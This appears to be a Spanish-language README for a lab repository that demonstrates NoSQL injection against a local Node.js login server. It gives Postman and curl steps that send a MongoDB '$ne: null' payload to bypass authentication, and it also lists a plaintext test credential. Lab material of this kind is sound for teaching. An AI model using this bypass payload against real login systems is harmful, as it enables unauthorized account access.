# NoSQL-Inyection

## Instalación y Ejecución (Linux y Windows)

### 1. Clonar el repositorio
Abre una terminal y ejecuta el siguiente comando:
```sh
git clone https://github.com/JavierNila/NoSQL-Inyection.git
cd NoSQL-Inyection
```

### 2. Instalar dependencias
Ejecuta el siguiente comando dentro de la carpeta del proyecto:
```sh
npm install
```
Esto instalará todas las dependencias necesarias definidas en `package.json`.

### 3. Ejecutar el servidor
Inicia el backend con:
```sh
node server.js
```
El servidor correrá en `http://localhost:3000`.

### 4. Abrir el frontend
- Abre el archivo `index.html` en el navegador.

## Uso de la Aplicación
1. Ingresa un usuario y una contraseña en la interfaz web (`index.html`).
2. Al presionar "Ingresar", el formulario enviará una solicitud `POST` al backend (`server.js`) en `http://localhost:3000/login`.
3. Para probar la inyección NoSQL, se puede utilizar una herramienta como Postman o `curl`.

### Prueba con Postman
- Abre Postman y crea una nueva solicitud `POST` a `http://localhost:3000/login`.
- En el apartado "Body", selecciona "raw" y el tipo `JSON`.
- Ingresa la siguiente carga útil:
  ```json
  {
    "username": { "$ne": null },
    "password": { "$ne": null }
  }
  ```
- Envía la solicitud y verifica que la autenticación se realice sin credenciales válidas.

### Prueba con curl
También puedes enviar la inyección desde la terminal con:
```sh
curl -X POST http://localhost:3000/login -H "Content-Type: application/json" -d '{"username": { "$ne": null }, "password": { "$ne": null }}'
```
Esto permitirá autenticarse sin credenciales válidas debido a la vulnerabilidad NoSQL Injection.

## Nota Importante
Las credenciales otorgadas (`username: student`, `password: dPgF0sb0ADBUZHCI`) no funcionan por razones desconocidas.
